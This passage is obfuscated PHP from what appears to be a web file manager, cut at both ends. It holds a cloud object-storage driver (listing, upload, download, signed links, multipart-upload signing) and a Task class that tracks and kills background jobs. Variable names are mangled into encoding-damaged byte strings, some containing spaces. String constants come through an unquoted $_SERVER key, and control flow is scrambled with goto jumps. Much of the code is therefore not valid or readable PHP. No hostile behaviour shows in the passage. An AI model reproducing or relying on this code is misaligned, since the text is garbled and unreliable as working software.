$_SERVER[…Ò×–]; if ($FÙ³¬ŠÄ•) { return array($b˜¡ÎÇÇ©†[28] => $this->pathThis($B™ö÷—¢ïÌ), $b˜¡ÎÇÇ©†[75] => $this->getPathOuter($b˜¡ÎÇÇ©†[8] . $B™ö÷—¢ïÌ), $b˜¡ÎÇÇ©†[29] => $b˜¡ÎÇÇ©†[76], $b˜¡ÎÇÇ©†[192] => !0, $b˜¡ÎÇÇ©†[193] => !0); } $AˆÙ‹­½† = array($b˜¡ÎÇÇ©†[28] => $this->pathThis($B™ö÷—¢ïÌ), $b˜¡ÎÇÇ©†[75] => $this->getPathOuter($b˜¡ÎÇÇ©†[8] . $B™ö÷—¢ïÌ), $b˜¡ÎÇÇ©†[29] => $b˜¡ÎÇÇ©†[76], $b˜¡ÎÇÇ©†[191] => 0, $b˜¡ÎÇÇ©†[107] => 0, $b˜¡ÎÇÇ©†[192] => !0, $b˜¡ÎÇÇ©†[193] => !0); goto dê­›¸ÜÑ; a´ùøññ¤Š: } public function listObjs($D‹¨²ß•î§, $c¡ÎŠ†ËÁ¯ = null, $aÈë‹ê»¬’ = null, $a‡çÖÃ§Ñ = null) { $CÜŞ“ÕàŞÓ =& $_SERVER[…Ò×–]; $D‹¨²ß•î§ = trim($D‹¨²ß•î§, $CÜŞ“ÕàŞÓ[8]); $EÆ®·í’â = empty($D‹¨²ß•î§) ? $CÜŞ“ÕàŞÓ[33] : $D‹¨²ß•î§ . $CÜŞ“ÕàŞÓ[8]; return $this->client->getBucket($this->bucket, $EÆ®·í’â, $c¡ÎŠ†ËÁ¯, $aÈë‹ê»¬’, $a‡çÖÃ§Ñ, !0); } public function has($B¡‘ä‘æšŒ, $EÚ†æãÆ…æ = false, $DÖÍò±ïÜ£ = true) { goto D•Š…¡›²; D•Š…¡›²: $Cˆ–£¢‡¹ =& $_SERVER[…Ò×–]; $bÜÄÎøÈÓ» = 0; $dˆèÂ¦Ÿ×Ò = 0; goto BŒÎóíÔ˜; D©Èƒ·“—î: if ($EÚ†æãÆ…æ) { return array($Cˆ–£¢‡¹[195] => $bÜÄÎøÈÓ», $Cˆ–£¢‡¹[196] => $dˆèÂ¦Ÿ×Ò); } return !1; goto fïìÉäø¿¡; BŒÎóíÔ˜: $Eª‹öÌßî¨ = $this->listObjs($B¡‘ä‘æšŒ, null, null, $Cˆ–£¢‡¹[8]); $Eª‹öÌßî¨ = is_array($Eª‹öÌßî¨) ? $Eª‹öÌßî¨ : array(); foreach ($Eª‹öÌßî¨ as $dîó¿êÊ­Ê) { if (isset($dîó¿êÊ­Ê[$Cˆ–£¢‡¹[28]]) && substr($dîó¿êÊ­Ê[$Cˆ–£¢‡¹[28]], -1) != $Cˆ–£¢‡¹[8]) { if (!$EÚ†æãÆ…æ && $DÖÍò±ïÜ£) { return !0; } $bÜÄÎøÈÓ»++; } else { if (isset($dîó¿êÊ­Ê[$Cˆ–£¢‡¹[190]])) { if (!$EÚ†æãÆ…æ && !$DÖÍò±ïÜ£) { return !1; } $dˆèÂ¦Ÿ×Ò++; } } } goto D©Èƒ·“—î; fïìÉäø¿¡: } public function listAll($DÁÀøøµÉõ) { $bËØäõ¥Ëâ =& $_SERVER[…Ò×–]; $bŞÍ …êç = $this->listObjs($DÁÀøøµÉõ); $B°âÁŒ‹ = $d’ŠÃŸô·† = array(); foreach ($bŞÍ …êç as $dÄñ±Šìˆ => $f Ş÷ï) { $B°âÁŒ‹[] = $f Ş÷ï[$bËØäõ¥Ëâ[28]]; $d’ŠÃŸô·†[$dÄñ±Šìˆ] = $f Ş÷ï[$bËØäõ¥Ëâ[77]]; } return $this->listAllFiles($DÁÀøøµÉõ, $B°âÁŒ‹, $d’ŠÃŸô·†); } public function canRead($d§™Šñò’È) { $DÖÉÁÆò® =& $_SERVER[…Ò×–]; $Bê‰Ü”¹Ö¬ = $this->client->getAccessControlPolicy($this->bucket, $d§™Šñò’È); if (!$Bê‰Ü”¹Ö¬) { return !1; } return in_array($Bê‰Ü”¹Ö¬, array($DÖÉÁÆò®[197], $DÖÉÁÆò®[198], $DÖÉÁÆò®[199])) ? !0 : !1; } public function canWrite($E¡Í ’¸Î–) { $A¤ƒƒ”‰îƒ =& $_SERVER[…Ò×–]; $Eä¬‘™ö¼ = $this->client->getAccessControlPolicy($this->bucket, $E¡Í ’¸Î–); if (!$Eä¬‘™ö¼) { return !1; } return in_array($Eä¬‘™ö¼, array($A¤ƒƒ”‰îƒ[197], $A¤ƒƒ”‰îƒ[198])) ? !0 : !1; } public function getContent($A°½¯Ä‘÷) { return $this->client->getObject($this->bucket, $A°½¯Ä‘÷); } public function setContent($a·éã“ºù¢, $dóœÚ‡Ÿ³ = '', $FùäŞ‚×‚ = false) { goto a´‚èñôÔ; föñÒÂ®óİ: $this->cacheMethod(null, null); $DŸùÛ¬¿¸× = $this->copyFile($a·éã“ºù¢, $a·éã“ºù¢, array($fÃôÜ£†¬Ğ[200] => $DŸùÛ¬¿¸×[$fÃôÜ£†¬Ğ[201]])); return $DŸùÛ¬¿¸× ? !0 : !1; goto BâÊÇšÀËÅ; DãÌ©ñËà™: $DŸùÛ¬¿¸× = $this->client->putObject($dóœÚ‡Ÿ³, $this->bucket, $a·éã“ºù¢, $fÃôÜ£†¬Ğ[189], array(), $b­Ê¨Âóç); if (!$DŸùÛ¬¿¸×) { return !1; } if ($FùäŞ‚×‚) { return !0; } goto föñÒÂ®óİ; a´‚èñôÔ: $fÃôÜ£†¬Ğ =& $_SERVER[…Ò×–]; $a·éã“ºù¢ = $FùäŞ‚×‚ ? trim($a·éã“ºù¢, $fÃôÜ£†¬Ğ[8]) . $fÃôÜ£†¬Ğ[8] : $a·éã“ºù¢; $b­Ê¨Âóç = get_file_mime(get_path_ext($a·éã“ºù¢)); goto DãÌ©ñËà™; BâÊÇšÀËÅ: } public function fileSubstr($eÛÙ¬´ßãÀ, $DÆ—á—¾ö, $CİÔŒ¢¨À¹) { $b”î±³Ê’à = $DÆ—á—¾ö + $CİÔŒ¢¨À¹ - 1; return $this->client->getObject($this->bucket, $eÛÙ¬´ßãÀ, array($_SERVER[…Ò×–][202] => "\142\x79\x74\145\163\x3d{$DÆ—á—¾ö}\55{$b”î±³Ê’à}")); } public function upload($f §”ˆ¼, $c‘Ñœƒ»», $a†÷›¨’¡Á = false, $bÀçæÆ­Ş = REPEAT_REPLACE) { $AôÃ»¾®ß° =& $_SERVER[…Ò×–]; $BíãÂ”öŒ = array($AôÃ»¾®ß°[200] => @md5_file($c‘Ñœƒ»»)); $b½‰Äâ°ŒĞ = array($AôÃ»¾®ß°[203] => get_file_mime(get_path_ext($f §”ˆ¼))); if (IO::size($c‘Ñœƒ»») <= 1024 * 1024 * 200) { $aÚöš‘•£§ = $this->client->putObjectFile($c‘Ñœƒ»», $this->bucket, $f §”ˆ¼, $AôÃ»¾®ß°[189], $BíãÂ”öŒ, $b½‰Äâ°ŒĞ); return !empty($aÚöš‘•£§) ? $this->getPathOuter($f §”ˆ¼) : !1; } $eâ•œ·æá = $this->client->multiUploadObject($c‘Ñœƒ»», $this->bucket, trim($f §”ˆ¼, $AôÃ»¾®ß°[8]), $BíãÂ”öŒ, $b½‰Äâ°ŒĞ); return $eâ•œ·æá ? $this->getPathOuter($f §”ˆ¼) : !1; } public function download($c˜‚¼×Ãƒ, $aÑĞõ®¢³„) { if (!@is_dir($this->pathFather($aÑĞõ®¢³„)) && !IO::mkdir($this->pathFather($aÑĞõ®¢³„))) { return !1; } $eöÍÛ’öª§ = $this->client->getObject($this->bucket, $c˜‚¼×Ãƒ, array(), $aÑĞõ®¢³„); return $eöÍÛ’öª§ !== !1 ? $aÑĞõ®¢³„ : !1; } public function link($f†®ŒÎ—êÇ, $B‚„¹˜ÏÍò = array()) { $fË¹¡°™ó¨ =& $_SERVER[…Ò×–]; if ($this->signVer == $fË¹¡°™ó¨[204]) { return $this->client->getAuthenticatedURL($this->bucket, $f†®ŒÎ—êÇ, 3600 * 12, $B‚„¹˜ÏÍò); } return $this->client->getObjectUrl($this->accessKey, $this->secret, $this->bucket, trim($f†®ŒÎ—êÇ, $fË¹¡°™ó¨[8]), 3600 * 12, $this->region, array(), !0, $B‚„¹˜ÏÍò); } public function fileOut($E²¹Ë­¨õ£, $AƒŠã™ = false, $A´‚ò³ÄŠá = false, $Cï ÌŞíìê = '') { goto bØ³¯‰¶Ş; bØ³¯‰¶Ş: $b¢õÁßç¢ =& $_SERVER[…Ò×–]; if ($this->isFileOutServer()) { return $this->fileOutServer($E²¹Ë­¨õ£, $AƒŠã™, $A´‚ò³ÄŠá, $Cï ÌŞíìê); } if (!$A´‚ò³ÄŠá) { $A´‚ò³ÄŠá = $this->pathThis($E²¹Ë­¨õ£); } goto dï…ÍÀ‡¤´; dï…ÍÀ‡¤´: $fšˆ¬§¿¼Ü = get_file_mime(get_path_ext($A´‚ò³ÄŠá)); if ($fšˆ¬§¿¼Ü == $b¢õÁßç¢[205]) { return parent::fileOut($E²¹Ë­¨õ£, $AƒŠã™, $A´‚ò³ÄŠá, $Cï ÌŞíìê); } $AƒŠã™ = $AƒŠã™ ? $b¢õÁßç¢[206] : $b¢õÁßç¢[207]; goto cÂ¬»áËÃ¸; cÂ¬»áËÃ¸: $aĞ˜ïèæ¡ = array($b¢õÁßç¢[208] => $AƒŠã™ . $b¢õÁßç¢[209] . rawurlencode($A´‚ò³ÄŠá), $b¢õÁßç¢[210] => $fšˆ¬§¿¼Ü); $b÷™ë••ß = $this->link($E²¹Ë­¨õ£, $aĞ˜ïèæ¡); $this->fileOutLink($b÷™ë••ß); goto BŠà©…‰ÉØ; BŠà©…‰ÉØ: } public function fileOutServer($Bªæ÷‹¾ëÑ, $d¬Œ†´¨£Ù = false, $a’‹‚àîµ™ = false, $D¿İÙ¬ºÅ‚ = '') { parent::fileOut($Bªæ÷‹¾ëÑ, $d¬Œ†´¨£Ù, $a’‹‚àîµ™, $D¿İÙ¬ºÅ‚); } public function fileOutImageServer($bÉ‚¸„ˆ²¼, $d¢‹¯ŸË© = 250) { parent::fileOutImage($bÉ‚¸„ˆ²¼, $d¢‹¯ŸË©); } public function hashMd5($a­•ƒÀÆÇä, $E³•Š§£º = '') { $E—˜ÔâŠÑ =& $_SERVER[…Ò×–]; $F”§À¤ö“› = $this->objectMeta($a­•ƒÀÆÇä); if (!$F”§À¤ö“›) { return !1; } $E³•Š§£º = $E³•Š§£º ? $E³•Š§£º : _get($F”§À¤ö“›, $E—˜ÔâŠÑ[211]); $E³•Š§£º = $E³•Š§£º ? $E³•Š§£º : _get($F”§À¤ö“›, $E—˜ÔâŠÑ[201], $E—˜ÔâŠÑ[33]); return $E³•Š§£º; } public function uploadFormData($Eíâå°Ö¼š, $dÄñ‚‹î£˜ = 3600) { $AƒÅÕÑæñ† =& $_SERVER[…Ò×–]; $CËˆ¯ª„±‹ = $this->pathFather($Eíâå°Ö¼š); $EµÒ’³Ôˆî = $this->client->getHttpUploadPostParams($this->bucket, $CËˆ¯ª„±‹, $AƒÅÕÑæñ†[189], $dÄñ‚‹î£˜); return array_merge((array) $EµÒ’³Ôˆî, array($AƒÅÕÑæñ†[173] => $this->getHost())); } public function multiUploadFormData($DÅñˆ¶¹, $AÆ‘®ùù = 3600) { $Bâ×¡™·ª =& $_SERVER[…Ò×–]; $DÁáÈ«µÄ° = gmdate($Bâ×¡™·ª[212]); $fÑ¡‚èê = array(); $B¼ ‘¸‡ŸÄ = $this->client->getUploadId($this->bucket, $DÅñˆ¶¹, $fÑ¡‚èê); if (!$B¼ ‘¸‡ŸÄ) { return !1; } return array($Bâ×¡™·ª[213] => $B¼ ‘¸‡ŸÄ, $Bâ×¡™·ª[173] => $this->getHost() . $Bâ×¡™·ª[8] . $this->pathEncode($DÅñˆ¶¹), $Bâ×¡™·ª[214] => $DÁáÈ«µÄ°, $Bâ×¡™·ª[89] => $DÅñˆ¶¹); } public function multiUploadAuthData($Bä«Ÿ³³æ‹, $eôÑÙğ–ëâ = array()) { goto fõÉÔêµ¤‰; Fë¯Ì×è¨¯: if (strpos($D™Â¶˜ÓË, $d±çÆğ¥ ‹[217]) === 0) { return array($d±çÆğ¥ ‹[224] => $d°†Ò£¯ç, $d±çÆğ¥ ‹[214] => $AŠ³Ä’Ìä‡); } return $d°†Ò£¯ç; goto AóÕ½Ú„íø; bó‰‚ğ˜±Ü: $b•ãÍõ±„ì = $eôÑÙğ–ëâ[$d±çÆğ¥ ‹[89]]; unset($eôÑÙğ–ëâ[$d±çÆğ¥ ‹[89]]); if (isset($eôÑÙğ–ëâ[$d±çÆğ¥ ‹[215]])) { $eôÑÙğ–ëâ[$d±çÆğ¥ ‹[214]] = $AŠ³Ä’Ìä‡; return $this->listUploadParts($b•ãÍõ±„ì, $eôÑÙğ–ëâ); } goto Bï½øÒçÌ„; Cà½øµ°Å: $aÊ‘¢È‡¶ğ = implode($d±çÆğ¥ ‹[221], $Fİè–³¤È„); $BóÍÅŞ­¬ = base64_encode(hash_hmac($d±çÆğ¥ ‹[222], $aÊ‘¢È‡¶ğ, $this->secret, !0)); $d°†Ò£¯ç = $d±çÆğ¥ ‹[223] . $this->accessKey . $d±çÆğ¥ ‹[4] . $BóÍÅŞ­¬; goto Fë¯Ì×è¨¯; fõÉÔêµ¤‰: $d±çÆğ¥ ‹ =& $_SERVER[…Ò×–]; $AŠ³Ä’Ìä‡ = isset($eôÑÙğ–ëâ[$d±çÆğ¥ ‹[214]]) ? $eôÑÙğ–ëâ[$d±çÆğ¥ ‹[214]] : gmdate($d±çÆğ¥ ‹[212]); $D™Â¶˜ÓË = isset($eôÑÙğ–ëâ[$d±çÆğ¥ ‹[165]]) ? $eôÑÙğ–ëâ[$d±çÆğ¥ ‹[165]] : $d±çÆğ¥ ‹[33]; goto bó‰‚ğ˜±Ü; Bï½øÒçÌ„: $Fİè–³¤È„ = array($d±çÆğ¥ ‹[216], $d±çÆğ¥ ‹[33], $d±çÆğ¥ ‹[116], $d±çÆğ¥ ‹[33], "\x78\55\141\155\172\x2d\144\141\x74\x65\72{$AŠ³Ä’Ìä‡}", $d±çÆğ¥ ‹[8] . $this->bucket . $d±çÆğ¥ ‹[8] . $this->pathEncode($b•ãÍõ±„ì) . $D™Â¶˜ÓË); if (strpos($D™Â¶˜ÓË, $d±çÆğ¥ ‹[217]) === 0) { $Fİè–³¤È„[0] = $d±çÆğ¥ ‹[218]; } if (isset($eôÑÙğ–ëâ[$d±çÆğ¥ ‹[219]]) && $eôÑÙğ–ëâ[$d±çÆğ¥ ‹[219]] == $d±çÆğ¥ ‹[220]) { $Fİè–³¤È„[0] = $d±çÆğ¥ ‹[220]; } goto Cà½øµ°Å; AóÕ½Ú„íø: } public function listUploadParts($C“êÙğ³¸Ñ, $f‚„ÂæÎ² = array()) { goto A÷´Ç†²…; A÷´Ç†²…: $AÏ•§ÓŠ—É =& $_SERVER[…Ò×–]; $EòõÁ¥å = str_replace($AÏ•§ÓŠ—É[225], $AÏ•§ÓŠ—É[33], $f‚„ÂæÎ²[$AÏ•§ÓŠ—É[165]]); $F´··İ‡© = $this->client->listParts($this->bucket, $C“êÙğ³¸Ñ, $EòõÁ¥å); goto BÉƒ½ã¬; E…º–¾„àÛ: $b¬Û¹­Ğµó = $this->multiUploadAuthData($C“êÙğ³¸Ñ, $f‚„ÂæÎ²); if (empty($b¬Û¹­Ğµó)) { return !1; } return array($AÏ•§ÓŠ—É[224] => $b¬Û¹­Ğµó, $AÏ•§ÓŠ—É[214] => $f‚„ÂæÎ²[$AÏ•§ÓŠ—É[214]], $AÏ•§ÓŠ—É[226] => $F´··İ‡©); goto e°Ş×¸ÀÏÆ; BÉƒ½ã¬: if (!$F´··İ‡©) { return !1; } unset($f‚„ÂæÎ²[$AÏ•§ÓŠ—É[215]], $f‚„ÂæÎ²[$AÏ•§ÓŠ—É[219]]); $f‚„ÂæÎ²[$AÏ•§ÓŠ—É[89]] = $C“êÙğ³¸Ñ; goto E…º–¾„àÛ; e°Ş×¸ÀÏÆ: } public function getHost() { return parent::getHost() . $_SERVER[…Ò×–][8] . $this->bucket; } public function size($F™¶Åª¸”š) { $a‡®¤Óâ = $this->objectMeta($F™¶Åª¸”š); return $a‡®¤Óâ ? $a‡®¤Óâ[$_SERVER[…Ò×–][77]] : 0; } public function info($béöœ›») { if ($this->isFolder($béöœ›»)) { return $this->folderInfo($béöœ›»); } else { if ($this->isFile($béöœ›»)) { return $this->fileInfo($béöœ›»); } } return !1; } public function exist($fÑùª½òáä) { return $this->isFile($fÑùª½òáä) || $this->isFolder($fÑùª½òáä); } public function isFile($E±ô„–·‰ç) { return !$this->isFolder($E±ô„–·‰ç) && $this->objectMeta($E±ô„–·‰ç); } public function isFolder($Dî—©èÎ·Ë) { return $this->cacheMethod($_SERVER[…Ò×–][227], $Dî—©èÎ·Ë); } protected function objectMeta($f„éø¿îá) { return $this->cacheMethod($_SERVER[…Ò×–][228], $f„éø¿îá); } protected function _objectMeta($Cô¢·×·Ù±) { $c·’ğÂÏô =& $_SERVER[…Ò×–]; $Cô¢·×·Ù± = rtrim($Cô¢·×·Ù±, $c·’ğÂÏô[8]); try { $c‰ëìµ±ÅÌ = $this->client->getObjectInfo($this->bucket, $Cô¢·×·Ù±); if (!isset($c‰ëìµ±ÅÌ[$c·’ğÂÏô[211]]) && isset($c‰ëìµ±ÅÌ[$c·’ğÂÏô[229]])) { $c‰ëìµ±ÅÌ[$c·’ğÂÏô[211]] = $c‰ëìµ±ÅÌ[$c·’ğÂÏô[229]]; } } catch (Exception $F“­èÃĞïï) { $c‰ëìµ±ÅÌ = !1; } if (!$c‰ëìµ±ÅÌ) { } return $c‰ëìµ±ÅÌ; } protected function _isFolder($c–ìñ‰³) { goto cÑ•æŒ¿Ç’; E†Â’‘òÊã: $EÒâÒ‹ãéµ = $this->client->getBucket($this->bucket, $c–ìñ‰³, null, 1); if (empty($EÒâÒ‹ãéµ)) { return !1; } $EÒâÒ‹ãéµ = array_values($EÒâÒ‹ãéµ); goto dÓÓªÂµÕ–; dÓÓªÂµÕ–: if (substr($EÒâÒ‹ãéµ[0][$AÙ©¬øÉİ‹[28]], -1) == $AÙ©¬øÉİ‹[8]) { return !0; } if (get_path_this($EÒâÒ‹ãéµ[0][$AÙ©¬øÉİ‹[28]]) == get_path_this($c–ìñ‰³)) { return !1; } return !0; goto a˜ëµ•™Œ˜; cÑ•æŒ¿Ç’: $AÙ©¬øÉİ‹ =& $_SERVER[…Ò×–]; $c–ìñ‰³ = rtrim($c–ìñ‰³, $AÙ©¬øÉİ‹[8]); if ($c–ìñ‰³ == $AÙ©¬øÉİ‹[33] || $c–ìñ‰³ == $AÙ©¬øÉİ‹[8]) { return !0; } goto E†Â’‘òÊã; a˜ëµ•™Œ˜: } } define($_SERVER[…Ò×–][230], 1); goto CÀ ÇÄëÙÖ; eºïÇÁ—¡ï: class Task { const STATYS_STOP = "\x73\x74\157\160"; const STATYS_RUNNING = "\x72\x75\x6e\156\x69\x6e\147"; const STATYS_KILL = "\x6b\x69\x6c\x6c"; public $task; public function __destruct() { $this->end(); } public function __construct($a› ÜóÖ, $d²Õß†ö = '', $aÉ“­ğĞÎô = 0, $e„˜—Ú§Ú = '') { goto F¡äªÊ·¦; F¡äªÊ·¦: $F¨ì¼›×ºç =& $_SERVER[…Ò×–]; if (self::get($a› ÜóÖ)) { return; } $this->task = array($F¨ì¼›×ºç[371] => $a› ÜóÖ, $F¨ì¼›×ºç[1450] => USER_ID, $F¨ì¼›×ºç[1354] => $e„˜—Ú§Ú, $F¨ì¼›×ºç[29] => $d²Õß†ö, $F¨ì¼›×ºç[985] => $F¨ì¼›×ºç[33], $F¨ì¼›×ºç[983] => $aÉ“­ğĞÎô, $F¨ì¼›×ºç[997] => 0, $F¨ì¼›×ºç[1451] => 0, $F¨ì¼›×ºç[1452] => 0, $F¨ì¼›×ºç[1453] => timeFloat(), $F¨ì¼›×ºç[1454] => 0, $F¨ì¼›×ºç[1455] => 0, $F¨ì¼›×ºç[1456] => 0, $F¨ì¼›×ºç[1457] => 0, $F¨ì¼›×ºç[694] => $F¨ì¼›×ºç[1414]); goto C‡ ‘½£éÄ; C‡ ‘½£éÄ: Hook::bind($F¨ì¼›×ºç[1416], array($this, $F¨ì¼›×ºç[1458])); Hook::bind($F¨ì¼›×ºç[1459], array($this, $F¨ì¼›×ºç[1460])); $this->startAfter(); goto f¨ëöêÅä; f¨ëöêÅä: Hook::trigger($F¨ì¼›×ºç[1461], $this->task); $this->task[$F¨ì¼›×ºç[1455]] = timeFloat(); goto F·¹°Â©Ş¡; F·¹°Â©Ş¡: } public function end() { goto E”Î”Ïİƒ; E”Î”Ïİƒ: $d·ˆĞ¨’Ì =& $_SERVER[…Ò×–]; if (!$this->task) { return; } if ($this->task[$d·ˆĞ¨’Ì[1455]]) { self::valueSet($this->task[$d·ˆĞ¨’Ì[371]], !1); } goto f…­èëÚ­³; cÈŒßì®‘: Hook::unbind($d·ˆĞ¨’Ì[1459], array($this, $d·ˆĞ¨’Ì[1460])); $this->endAfter(); $this->task = !1; goto D…½ƒ´Ñ¦Ü; f…­èëÚ­³: $dÜšåà¾ã = timeFloat() - $this->task[$d·ˆĞ¨’Ì[1453]]; self::log($d·ˆĞ¨’Ì[1462] . $this->task[$d·ˆĞ¨’Ì[371]] . $d·ˆĞ¨’Ì[1463] . $dÜšåà¾ã . $d·ˆĞ¨’Ì[1464]); Hook::unbind($d·ˆĞ¨’Ì[1416], array($this, $d·ˆĞ¨’Ì[1458])); goto cÈŒßì®‘; D…½ƒ´Ñ¦Ü: } public function update($dÁ·À³¾ƒŠ = 0, $fùŒ ‰Å = false) { goto D¨øØ“¸Û¨; C¡‰Ö»‘Ç: $this->updateAfter(); $E¡ÜÏ”çÜ = 0.2; if (timeFloat() - $eÂóí‡á˜á[$Dƒ·”ïìƒ·[1455]] < $E¡ÜÏ”çÜ && !$fùŒ ‰Å) { return; } goto eš÷«å¤ß·; eš÷«å¤ß·: $D‡õ†îÀĞ = self::get($eÂóí‡á˜á[$Dƒ·”ïìƒ·[371]]); $E·Ä«ÜÓĞš = $D‡õ†îÀĞ[$Dƒ·”ïìƒ·[694]]; if ($E·Ä«ÜÓĞš == self::STATYS_KILL) { $E‰ÌÕ·×»¾ = array($Dƒ·”ïìƒ·[1465] => LNG($Dƒ·”ïìƒ·[1466]), $Dƒ·”ïìƒ·[1043] => !1); Cache::set($Dƒ·”ïìƒ·[1467] . $this->task[$Dƒ·”ïìƒ·[371]], $E‰ÌÕ·×»¾, 30); $this->end(); die; } else { if ($E·Ä«ÜÓĞš == self::STATYS_STOP) { $d‡¢…‘Õğ³ = 2; $D‡õ†îÀĞ[$Dƒ·”ïìƒ·[1456]] += $d‡¢…‘Õğ³; self::valueSet($eÂóí‡á˜á[$Dƒ·”ïìƒ·[371]], $D‡õ†îÀĞ); sleep($d‡¢…‘Õğ³); $this->update(); return; } } goto bç‰´Ş‰®ç; b‹Úéµªƒ‘: Hook::trigger($Dƒ·”ïìƒ·[1468], $eÂóí‡á˜á); self::valueSet($eÂóí‡á˜á[$Dƒ·”ïìƒ·[371]], $eÂóí‡á˜á); goto c„¾ºŞ‰¤½; B¹†Øôˆ·Ë: $eÂóí‡á˜á[$Dƒ·”ïìƒ·[997]] += $dÁ·À³¾ƒŠ; $eÂóí‡á˜á[$Dƒ·”ïìƒ·[1454]] = timeFloat(); if ($eÂóí‡á˜á[$Dƒ·”ïìƒ·[983]]) { if ($eÂóí‡á˜á[$Dƒ·”ïìƒ·[983]] < $eÂóí‡á˜á[$Dƒ·”ïìƒ·[997]]) { $eÂóí‡á˜á[$Dƒ·”ïìƒ·[983]] = $eÂóí‡á˜á[$Dƒ·”ïìƒ·[997]]; } $Fôˆ¯‹ÅÄ´ = timeFloat() - $eÂóí‡á˜á[$Dƒ·”ïìƒ·[1453]] - $eÂóí‡á˜á[$Dƒ·”ïìƒ·[1456]]; $eÂóí‡á˜á[$Dƒ·”ïìƒ·[1451]] = $eÂóí‡á˜á[$Dƒ·”ïìƒ·[997]] / $eÂóí‡á˜á[$Dƒ·”ïìƒ·[983]]; $eÂóí‡á˜á[$Dƒ·”ïìƒ·[1452]] = $eÂóí‡á˜á[$Dƒ·”ïìƒ·[997]] / $Fôˆ¯‹ÅÄ´; if ($eÂóí‡á˜á[$Dƒ·”ïìƒ·[1451]] > 0) { $eÂóí‡á˜á[$Dƒ·”ïìƒ·[1457]] = $Fôˆ¯‹ÅÄ´ * (1 - $eÂóí‡á˜á[$Dƒ·”ïìƒ·[1451]]) / $eÂóí‡á˜á[$Dƒ·”ïìƒ·[1451]]; } $eÂóí‡á˜á[$Dƒ·”ïìƒ·[1457]] = $eÂóí‡á˜á[$Dƒ·”ïìƒ·[1457]] <= 0 ? 0 : $eÂóí‡á˜á[$Dƒ·”ïìƒ·[1457]]; } goto C¡‰Ö»‘Ç; D¨øØ“¸Û¨: $Dƒ·”ïìƒ· =& $_SERVER[…Ò×–]; $eÂóí‡á˜á =& $this->task; if (!$eÂóí‡á˜á) { return; } goto B¹†Øôˆ·Ë; bç‰´Ş‰®ç: $eÂóí‡á˜á[$Dƒ·”ïìƒ·[694]] = $E·Ä«ÜÓĞš ? $E·Ä«ÜÓĞš : $eÂóí‡á˜á[$Dƒ·”ïìƒ·[694]]; $eÂóí‡á˜á[$Dƒ·”ïìƒ·[1456]] = $D‡õ†îÀĞ[$Dƒ·”ïìƒ·[1456]] ? $D‡õ†îÀĞ[$Dƒ·”ïìƒ·[1456]] : 0; $eÂóí‡á˜á[$Dƒ·”ïìƒ·[1455]] = timeFloat(); goto b‹Úéµªƒ‘; c„¾ºŞ‰¤½: } protected function updateAfter() { } protected function startAfter() { } protected function endAfter() { } public function shutdownEvent() { $this->end(); } public function showJson($fïÔÏš¥†Û) { $C±¨Ùí½† =& $_SERVER[…Ò×–]; Cache::set($C±¨Ùí½†[1467] . $this->task[$C±¨Ùí½†[371]], $fïÔÏš¥†Û, 60); return $fïÔÏš¥†Û; } public static function get($BµŠæÏÙ˜) { return self::valueGet($BµŠæÏÙ˜); } public static function listData() { $BÊŸ±ŠË¿ = self::valueGet(); return array_sort_by($BÊŸ±ŠË¿, $_SERVER[…Ò×–][1453], !0); } public static function kill($A›‰ˆ“´‘‚) { return self::changeStatus($A›‰ˆ“´‘‚, self::STATYS_KILL); } public static function stop($c¸¤Şõ¼Â) { return self::changeStatus($c¸¤Şõ¼Â, self::STATYS_STOP); } public static function restart($DÑöâ®î×Â) { return self::changeStatus($DÑöâ®î×Â, self::STATYS_RUNNING); } public static function killAll() { $AÃ¹½»Ï“ß =& $_SERVER[…Ò×–]; $fèÛÚÃ˜ = self::listData(); foreach ($fèÛÚÃ˜ as $aË´‚À‚¼…) { self::kill($aË´‚À‚¼…[$AÃ¹½»Ï“ß[371]]); } sleep(2); foreach ($fèÛÚÃ˜ as $aË´‚À‚¼…) { self::valueSet($aË´‚À‚¼…[$AÃ¹½»Ï“ß[371]], !1); } } private static function changeStatus($CÌîÑ•‘Ìš, $B»ºå‰¥¨) { goto eéçà¥; a¤Áµƒ˜ƒ: $c­×ÓëÁÓß[$A‹»ğÃ’å¥[694]] = $B»ºå‰¥¨; self::valueSet($CÌîÑ•‘Ìš, $c­×ÓëÁÓß); self::log($A‹»ğÃ’å¥[1469] . $c­×ÓëÁÓß[$A‹»ğÃ’å¥[371]] . $A‹»ğÃ’å¥[1470] . $B»ºå‰¥¨); goto BŞ½†¿ŒòÚ; BŞ½†¿ŒòÚ: return !0; goto BŒãºíÃÁ–; eéçà¥: $A‹»ğÃ’å¥ =& $_SERVER[…Ò×–]; $c­×ÓëÁÓß = self::valueGet($CÌîÑ•‘Ìš); if (!$c­×ÓëÁÓß) { return !1; } goto a¤Áµƒ˜ƒ; BŒãºíÃÁ–: } public static function valueGet($A¡«ñİñ¶ = false) { $dÒÛ…•« =& $_SERVER[…Ò×–]; if ($A¡«ñİñ¶) { $EÔìëÄ„Ãˆ = Model($dÒÛ…•«[403])->where(array($dÒÛ…•«[89] => $A¡«ñİñ¶, $dÒÛ…•«[29] => $dÒÛ…•«[1471]))->find(); return $EÔìëÄ„Ãˆ ? json_decode($EÔìëÄ„Ãˆ[$dÒÛ…•«[363]], !0) : !1; } return self::taskListUser(USER_ID); } public static function taskListUser($EäõŒÕˆÔ = false) { goto E˜Ş«íà²ƒ; DŸ¶ÃÈ¬—¦: $A«Ó¥ë¿¯ = Model($E¦ñ”ƒæŠ[403])->where($b¶Õ¡¼²©½)->select(); $A«Ó¥ë¿¯ = $A«Ó¥ë¿¯ ? $A«Ó¥ë¿¯ : array(); foreach ($A«Ó¥ë¿¯ as $cŸÎ¼¶Ï£– => $F¼ÂãÇ‡©²) { $A«Ó¥ë¿¯[$cŸÎ¼¶Ï£–] = json_decode($F¼ÂãÇ‡©²[$E¦ñ”ƒæŠ[363]], !0); } goto Aó°†ë£âö; Aó°†ë£âö: return $A«Ó¥ë¿¯; goto bÀÖ¬’íš; E˜Ş«íà²ƒ: $E¦ñ”ƒæŠ =& $_SERVER[…Ò×–]; $b¶Õ¡¼²©½ = array($E¦ñ”ƒæŠ[29] => $E¦ñ”ƒæŠ[1471]); if ($EäõŒÕˆÔ) { $b¶Õ¡¼²©½[$E¦ñ”ƒæŠ[1450]] = $EäõŒÕˆÔ; } goto DŸ¶ÃÈ¬—¦; bÀÖ¬’íš: } public static function valueSet($BÚò©ÖÇœÈ, $aö¸œÜÊ„“) { goto B¸ÊÃ”é¯å; eíœµ›»ã¸: Model($E¤¼÷‡ëä[403])->add($fî†•Â®Âæ, array(), !0); goto b×¹öÈ¸¿Ş; B¸ÊÃ”é¯å: $E¤¼÷‡ëä =& 